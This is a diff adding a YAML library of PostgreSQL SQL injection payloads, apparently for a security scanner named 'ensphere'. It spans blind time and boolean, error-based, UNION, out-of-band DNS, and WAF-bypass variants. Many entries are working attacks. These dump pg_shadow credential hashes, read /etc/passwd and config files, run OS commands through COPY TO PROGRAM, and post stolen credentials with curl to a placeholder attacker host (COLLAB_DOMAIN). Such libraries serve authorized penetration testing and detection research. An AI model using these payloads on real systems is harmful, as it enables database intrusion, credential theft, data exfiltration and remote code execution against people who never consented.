@@ -1,0 +1,849 @@
+defaults:
+  vuln_type: sqli
+  db_engine: postgres
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # BLIND TIME-BASED
+  # ============================================================
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Basic time-based blind. Inject in string context. Observe response delay vs baseline."
+    tags: [pg_sleep, confirmation]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(SLEEP_SECONDS) ELSE pg_sleep(0) END)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Conditional time delay. Change 1=1 to actual boolean condition for data extraction."
+    tags: [pg_sleep, conditional, extraction]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: timing
+    risk: 2
+    payload: "1; SELECT pg_sleep(SLEEP_SECONDS)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Numeric context time-based blind via stacked query. Use when injection point is in an integer parameter."
+    tags: [pg_sleep, numeric, stacked]
+
+  - technique: blind_time
+    injection_surface: json_body
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind injected via JSON body field. Check if app deserializes JSON values into SQL."
+    tags: [pg_sleep, json]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "'; SELECT pg_sleep(SLEEP_SECONDS)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Stacked query time-based blind. Postgres supports stacked queries natively via libpq. Confirms stacked execution."
+    tags: [pg_sleep, stacked]
+
+  - technique: blind_time
+    injection_surface: header
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind via HTTP header (User-Agent, Referer, X-Forwarded-For). Many logging pipelines insert headers unsanitized."
+    tags: [pg_sleep, header]
+
+  - technique: blind_time
+    injection_surface: cookie
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind via cookie value. Target apps that store or query session data from cookies."
+    tags: [pg_sleep, cookie]
+
+  - technique: blind_time
+    injection_surface: form_body
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind via form POST body. Standard injection surface for form-based apps."
+    tags: [pg_sleep, form]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "' AND (SELECT pg_sleep(SLEEP_SECONDS) FROM pg_catalog.pg_user LIMIT 1)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Advisory side-channel: delays only if pg_user table is accessible. Confirms catalog read access without data extraction."
+    tags: [pg_sleep, advisory, privilege_check]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM pg_stat_statements)>0 THEN pg_sleep(SLEEP_SECONDS) ELSE pg_sleep(0) END)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Probes whether pg_stat_statements extension is enabled. If it fires, query history exfiltration is possible."
+    tags: [pg_sleep, pg_stat_statements, recon]
+
+  # ============================================================
+  # BLIND BOOLEAN-BASED
+  # ============================================================
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND 1=1--"
+    notes: "Boolean true condition. Compare response to false condition (1=2) for diff."
+    tags: [confirmation, baseline]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND 1=2--"
+    notes: "Boolean false condition. Use with true condition to establish boolean oracle."
+    tags: [confirmation, baseline]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT LENGTH(current_user))>0--"
+    notes: "Extract current_user length via boolean oracle. Iterate threshold to find exact length."
+    tags: [extraction, current_user]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT ASCII(SUBSTR(current_user,CHAR_POS,1)))>THRESHOLD--"
+    placeholders: [CHAR_POS, THRESHOLD]
+    notes: "Extract current_user char-by-char via binary search on ASCII value."
+    tags: [extraction, current_user, binary_search]
+
+  - technique: blind_boolean
+    injection_surface: json_body
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND 1=1--"
+    notes: "Boolean true condition via JSON body. Compare with 1=2 variant."
+    tags: [confirmation, json]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT usesuper FROM pg_user WHERE usename=current_user)--"
+    notes: "Boolean check whether current DB user is a superuser. If true-response, escalation payloads (COPY TO PROGRAM, lo_import) are viable."
+    tags: [privilege_check, superuser, recon]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>THRESHOLD--"
+    placeholders: [THRESHOLD]
+    notes: "Enumerate table count via boolean binary search. Start with large THRESHOLD and narrow down."
+    tags: [enumeration, information_schema, binary_search]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND EXISTS(SELECT 1 FROM pg_proc WHERE proname='dblink_connect')--"
+    notes: "Checks if dblink extension is installed. If true, OOB exfiltration via dblink is available."
+    tags: [recon, dblink, extension_check]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "\" AND 1=1--"
+    notes: "Double-quote boolean true condition. Use when injection is in an identifier (table/column name) context."
+    tags: [confirmation, double_quote]
+
+  # ============================================================
+  # ERROR-BASED
+  # ============================================================
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND 1=CAST((SELECT version()) AS int)--"
+    notes: "Forces type cast error that leaks PG version string in error message. First payload to try when errors are visible."
+    tags: [version, cast_error]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT current_user) AS int)--"
+    notes: "Leaks current_user via cast error. Requires verbose error messages."
+    tags: [current_user, cast_error]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET OFFSET_VAL) AS int)--"
+    placeholders: [OFFSET_VAL]
+    notes: "Leaks table names one by one. Increment OFFSET_VAL to enumerate all public tables."
+    tags: [enumeration, information_schema, cast_error]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: error
+    risk: 2
+    payload: "1 AND 1=CAST((SELECT version()) AS int)"
+    notes: "Numeric context error-based extraction. No quote needed."
+    tags: [version, cast_error, numeric]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "'; SELECT 1/0--"
+    notes: "Stacked query with division by zero. Confirms stacked query execution support."
+    tags: [stacked, division_by_zero, confirmation]
+
+  - technique: error_based
+    injection_surface: header
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND 1=CAST((SELECT version()) AS int)--"
+    notes: "Error-based extraction via header injection. Look for version string in error response body."
+    tags: [version, cast_error, header]
+
+  - technique: error_based
+    injection_surface: form_body
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND 1=CAST((SELECT version()) AS int)--"
+    notes: "Error-based extraction via form POST body."
+    tags: [version, cast_error, form]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: error
+    risk: 2
+    payload: "\" AND 1=CAST((SELECT version()) AS int)--"
+    notes: "Double-quote error-based version extraction. Use when injection is in identifier context."
+    tags: [version, cast_error, double_quote]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT query_to_xml('SELECT version()',true,false,'')) AS int)--"
+    notes: "query_to_xml error-based extraction. Returns version as XML in error. Useful when direct SELECT output is filtered."
+    tags: [xml, version, cast_error]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow) AS int)--"
+    notes: "Extract all credential hashes from pg_shadow via cast error. Requires superuser. Look for md5/scram hashes in error output."
+    tags: [credential_extraction, pg_shadow, cast_error, superuser]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT string_agg(conname||':'||pg_get_constraintdef(oid),';') FROM pg_constraint WHERE conrelid='TABLE_NAME'::regclass) AS int)--"
+    placeholders: [TABLE_NAME]
+    notes: "Enumerate constraints (PK, FK, UNIQUE, CHECK) for a table. Reveals relationships and business logic validators."
+    tags: [enumeration, constraints, cast_error, schema_recon]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT string_agg(indexname||':'||indexdef,';') FROM pg_indexes WHERE tablename='TABLE_NAME') AS int)--"
+    placeholders: [TABLE_NAME]
+    notes: "Enumerate indexes for a table. Reveals columns frequently queried and potential unique constraints."
+    tags: [enumeration, indexes, cast_error, schema_recon]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT string_agg(proname||'('||pg_get_function_arguments(oid)||')',',') FROM pg_proc WHERE pronamespace='public'::regnamespace) AS int)--"
+    notes: "Enumerate user-defined functions in the public schema. Custom functions often contain business logic or privilege escalation paths."
+    tags: [enumeration, functions, cast_error, schema_recon]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT string_agg(query,E'\\n') FROM pg_stat_statements LIMIT 5) AS int)--"
+    notes: "Extract recent query history from pg_stat_statements. Reveals SQL patterns, table names, and potential hardcoded secrets in queries."
+    tags: [pg_stat_statements, cast_error, query_history]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT string_agg(usename||':'||usesuper::text,',') FROM pg_user) AS int)--"
+    notes: "Enumerate all database users and their superuser status. Identifies high-privilege accounts for lateral movement."
+    tags: [pg_user, cast_error, privilege_recon]
+
+  # ============================================================
+  # UNION-BASED
+  # ============================================================
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "' UNION SELECT NULL --"
+    notes: "Column count probe. Add NULLs until no error: NULL,NULL / NULL,NULL,NULL etc. Space before comment for Postgres compatibility."
+    tags: [column_count, probe, postgres]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "' UNION SELECT NULL,NULL,NULL--"
+    notes: "3-column UNION probe. Adjust column count to match target query."
+    tags: [column_count, probe]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT version(),NULL,NULL--"
+    notes: "Extract PG version via UNION. Replace first NULL with version() in a string-type column position."
+    tags: [version, extraction]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--"
+    notes: "Enumerate public tables via UNION. Adjust column count to match."
+    tags: [enumeration, information_schema]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'--"
+    placeholders: [TABLE_NAME]
+    notes: "Enumerate columns of a specific table. Replace TABLE_NAME with target."
+    tags: [enumeration, information_schema, columns]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--"
+    notes: "All table names in one result via string_agg. Faster than iterating OFFSET."
+    tags: [enumeration, string_agg, information_schema]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT string_agg(column_name||':'||data_type,','),NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'--"
+    placeholders: [TABLE_NAME]
+    notes: "All columns and types for a table in one shot. Use after identifying target table."
+    tags: [enumeration, string_agg, columns]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT usename,passwd,NULL FROM pg_shadow--"
+    notes: "Extract credential hashes directly via UNION. Requires superuser. Returns md5 or scram-sha-256 hashes."
+    tags: [credential_extraction, pg_shadow, superuser]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT schemaname||'.'||tablename,tableowner,NULL FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')--"
+    notes: "List all non-system tables with their owners. Reveals custom schemas and ownership for privilege analysis."
+    tags: [enumeration, pg_tables, schema_recon]
+
+  # ============================================================
+  # OOB / DNS EXFILTRATION
+  # ============================================================
+
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 3
+    payload: "'; SELECT dblink_connect('host=COLLAB_DOMAIN dbname=test')--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS confirmation via dblink extension. Requires dblink to be installed. Check with boolean probe first."
+    tags: [oob, dns, dblink]
+
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 3
+    payload: "'; SELECT dblink_connect('host='||current_user||'.COLLAB_DOMAIN dbname=test')--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS exfiltration of current_user via dblink. Data appears as subdomain in DNS query."
+    tags: [oob, dns, dblink, exfiltration]
+
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 4
+    payload: "'; SELECT dblink_connect('host='||(SELECT encode(CONCAT(usename,':',passwd)::bytea,'hex') FROM pg_shadow LIMIT 1)||'.COLLAB_DOMAIN dbname=test')--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Exfiltrate hex-encoded credentials from pg_shadow via DNS. Hex encoding avoids DNS label character restrictions."
+    tags: [oob, dns, dblink, credential_extraction, superuser]
+
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: oob
+    risk: 4
+    payload: "'; SELECT dblink_connect('host=COLLAB_DOMAIN user='||current_user||' dbname='||(SELECT current_database()))--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Exfiltrate multiple values (user + database name) in a single dblink connection string. Data appears in DNS and connection metadata."
+    tags: [oob, dblink, multi_value, exfiltration]
+
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 4
+    payload: "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_DOMAIN'--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS confirmation via COPY TO PROGRAM. Requires superuser. Stronger signal than dblink since it proves RCE."
+    tags: [copy, oob, dns, superuser]
+
+  # ============================================================
+  # STACKED QUERIES - DATA STAGING AND RCE
+  # ============================================================
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 4
+    payload: "'; COPY (SELECT version()) TO PROGRAM 'curl http://COLLAB_DOMAIN/'--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "COPY TO PROGRAM for RCE. Requires superuser. Exfiltrate data via curl to attacker-controlled server."
+    tags: [copy, rce, oob, superuser]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 4
+    payload: "'; CREATE TEMP TABLE ensphere_exfil(d TEXT); COPY ensphere_exfil FROM PROGRAM 'id'; SELECT d FROM ensphere_exfil--"
+    notes: "Data staging via temp table + COPY FROM PROGRAM. Execute OS command and store result for later retrieval. Requires superuser."
+    tags: [copy, rce, temp_table, staging, superuser]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 4
+    payload: "'; CREATE TEMP TABLE ensphere_exfil(d TEXT); COPY ensphere_exfil FROM PROGRAM 'cat /etc/passwd'; SELECT string_agg(d,E'\\n') FROM ensphere_exfil--"
+    notes: "Read file via COPY FROM PROGRAM + temp table staging. Requires superuser. Use when lo_import is blocked."
+    tags: [copy, rce, file_read, temp_table, superuser]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 4
+    payload: "'; CREATE TEMP TABLE IF NOT EXISTS ensphere_stage(id SERIAL, data TEXT); INSERT INTO ensphere_stage(data) SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'; SELECT pg_sleep(SLEEP_SECONDS)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Stage enumeration data into temp table for later extraction. Delay confirms execution. Retrieve with UNION or error-based in follow-up request."
+    tags: [stacked, temp_table, staging, enumeration]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 5
+    payload: "'; COPY (SELECT string_agg(usename||':'||passwd,E'\\n') FROM pg_shadow) TO PROGRAM 'curl -d @- http://COLLAB_DOMAIN/creds'--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Full credential dump exfiltrated via HTTP POST. Requires superuser + network egress. Maximum risk payload."
+    tags: [copy, rce, credential_extraction, oob, superuser]
+
+  # ============================================================
+  # FILE SYSTEM ACCESS
+  # ============================================================
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 4
+    payload: "'; SELECT lo_import('/etc/passwd')--"
+    notes: "Import file as large object. Requires superuser. Retrieve content via lo_get(oid) in follow-up query."
+    tags: [large_object, file_read, superuser]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 4
+    payload: "' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL--"
+    notes: "Direct file read via pg_read_file(). Requires superuser or pg_read_server_files role. Returns file contents inline."
+    tags: [pg_read_file, file_read, superuser]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 4
+    payload: "' AND 1=CAST((SELECT pg_read_file('/etc/hostname')) AS int)--"
+    notes: "Leak hostname via pg_read_file + cast error. Short files work best with error-based extraction due to message length limits."
+    tags: [pg_read_file, file_read, cast_error, superuser]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 4
+    payload: "' UNION SELECT string_agg(pg_ls_dir,','),NULL,NULL FROM pg_ls_dir('/')--"
+    notes: "List directory contents via pg_ls_dir(). Requires superuser or pg_read_server_files role. Use to locate config files, app code, etc."
+    tags: [pg_ls_dir, directory_listing, superuser]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 4
+    payload: "' UNION SELECT pg_read_file('postgresql.conf',0,1000),NULL,NULL--"
+    notes: "Read PG config file with offset/length. Reveals listen_addresses, auth settings, extension configs. Requires superuser."
+    tags: [pg_read_file, config_read, superuser]
+
+  # ============================================================
+  # WAF BYPASS - COMMENT OBFUSCATION
+  # ============================================================
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'/**/AND/**/(SELECT/**/pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Comment obfuscation with /**/. Bypasses WAF rules that match on whitespace between SQL keywords."
+    tags: [pg_sleep, obfuscation, comment]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "'/**/AND/**/1=1--"
+    notes: "Comment-obfuscated boolean true. Use when space-based WAF rules block standard payloads."
+    tags: [confirmation, obfuscation, comment]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "'/**/AND/**/1=CAST((SELECT/**/version())/**/AS/**/int)--"
+    notes: "Comment-obfuscated error-based extraction. Every space replaced with inline comment."
+    tags: [version, cast_error, obfuscation, comment]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'--\nAND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Newline after single-line comment (--). The -- comments out the rest of line 1; line 2 continues the query. Bypasses single-line pattern matching."
+    tags: [pg_sleep, obfuscation, newline_comment]
+
+  # ============================================================
+  # WAF BYPASS - CHR() OBFUSCATION
+  # ============================================================
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "' AND (SELECT pg_sleep(SLEEP_SECONDS) WHERE CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)=(SELECT SUBSTR(current_user,1,5)))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "CHR() obfuscation for string comparison. Compares current_user prefix to 'admin' built from CHR() calls. Bypasses keyword-based WAFs."
+    tags: [pg_sleep, chr_obfuscation, waf_bypass]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT CHR(118)||CHR(101)||CHR(114)||CHR(115)||CHR(105)||CHR(111)||CHR(110),version(),NULL--"
+    notes: "CHR()-obfuscated string literal in UNION column. First column returns 'version' as label built from CHR(). Avoids string literal detection."
+    tags: [chr_obfuscation, waf_bypass, version]
+
+  # ============================================================
+  # WAF BYPASS - ENCODING VARIANTS
+  # ============================================================
+
+  - technique: blind_time
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "%27%20AND%20(SELECT%20pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "URL-encoded time-based blind. For targets where WAF inspects pre-decode but SQL engine sees decoded."
+    tags: [pg_sleep, url_encoded]
+
+  - technique: blind_boolean
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "%27%20AND%201%3D1--"
+    notes: "URL-encoded boolean true condition. Pair with 1=2 variant."
+    tags: [confirmation, url_encoded]
+
+  - technique: error_based
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "%27%20AND%201%3DCAST((SELECT%20version())%20AS%20int)--"
+    notes: "URL-encoded error-based version leak via cast error."
+    tags: [version, cast_error, url_encoded]
+
+  - technique: union
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "%27%20UNION%20SELECT%20NULL%20--"
+    notes: "URL-encoded UNION column count probe."
+    tags: [column_count, probe, url_encoded]
+
+  - technique: blind_time
+    injection_surface: query
+    encoding: double_url
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "%2527%2520AND%2520(SELECT%2520pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Double URL-encoded time-based blind. Bypasses WAFs that only single-decode before inspection."
+    tags: [pg_sleep, double_url_encoded, bypass]
+
+  - technique: blind_time
+    injection_surface: query
+    encoding: unicode
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "\\u0027 AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Unicode-encoded quote (\\u0027). Tests frameworks that normalize Unicode before SQL construction."
+    tags: [pg_sleep, unicode]
+
+  # ============================================================
+  # DOUBLE-QUOTE BOUNDARY
+  # ============================================================
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: timing
+    risk: 2
+    payload: "\" AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Double-quote context time-based blind. Use when injection is inside a PG identifier (table/column alias)."
+    tags: [pg_sleep, double_quote]
+
+  - technique: blind_time
+    injection_surface: json_body
+    string_boundary: double_quote
+    evidence_type: timing
+    risk: 2
+    payload: "\" AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Double-quote blind_time in JSON body context. For APIs that interpolate JSON values into identifier positions."
+    tags: [pg_sleep, double_quote, json]
+
+  # ============================================================
+  # ADVISORY LOCK SIDE-CHANNELS
+  # ============================================================
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "' AND (SELECT CASE WHEN (SELECT LENGTH(current_user))>THRESHOLD THEN pg_advisory_lock(1) ELSE pg_advisory_lock(2) END) IS NOT NULL--"
+    placeholders: [THRESHOLD]
+    notes: "Advisory lock side-channel. Different lock IDs taken depending on condition. Detectable via pg_locks inspection in a parallel connection or via timing of lock contention."
+    tags: [advisory_lock, side_channel, extraction]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: status_diff
+    risk: 3
+    payload: "' AND (SELECT pg_try_advisory_lock(LOCK_ID))--"
+    placeholders: [LOCK_ID]
+    notes: "pg_try_advisory_lock returns true/false. If the app reflects the boolean result differently (status code, redirect, content), use as an oracle. Non-blocking alternative to pg_sleep."
+    tags: [advisory_lock, side_channel, non_blocking]
+
+  # ============================================================
+  # NESTED SUBQUERY TECHNIQUES
+  # ============================================================
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT COUNT(*) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='public') AS t)>THRESHOLD--"
+    placeholders: [THRESHOLD]
+    notes: "Nested subquery to count tables. Wrapping in a subquery avoids restrictions on direct aggregate use in WHERE clauses."
+    tags: [nested_subquery, enumeration, binary_search]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT col FROM (SELECT string_agg(column_name,',') AS col FROM information_schema.columns WHERE table_name='TABLE_NAME') AS sub) AS int)--"
+    placeholders: [TABLE_NAME]
+    notes: "Nested subquery error-based column enumeration. Wraps string_agg in a subselect to work around ORMs that restrict direct function calls."
+    tags: [nested_subquery, enumeration, columns, cast_error]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT sub.data,NULL,NULL FROM (SELECT string_agg(table_name||':'||table_type,',') AS data FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')) AS sub--"
+    notes: "Nested subquery UNION extraction. The subselect aliases avoid column name conflicts and work around query rewriting by ORMs."
+    tags: [nested_subquery, enumeration, information_schema]
+
+  # ============================================================
+  # XML BODY INJECTION
+  # ============================================================
+
+  - technique: blind_time
+    injection_surface: xml_body
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND (SELECT pg_sleep(SLEEP_SECONDS))--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind via XML body. For SOAP/XML-RPC endpoints that parse XML element values into SQL."
+    tags: [pg_sleep, xml_body]
+
+  - technique: error_based
+    injection_surface: xml_body
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT version()) AS int)--"
+    notes: "Error-based extraction via XML body injection. SOAP faults often include verbose PG errors."
+    tags: [version, cast_error, xml_body]
+
+  # ============================================================
+  # UNQUOTED / NUMERIC BOUNDARY EXPANSION
+  # ============================================================
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "1 AND 1=1 --"
+    notes: "Numeric context boolean true for Postgres. For integer parameters (id=1, page=2). Compare with 1 AND 1=2."
+    tags: [confirmation, numeric, postgres]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: content_match
+    risk: 3
+    payload: "1 UNION SELECT version(),NULL,NULL--"
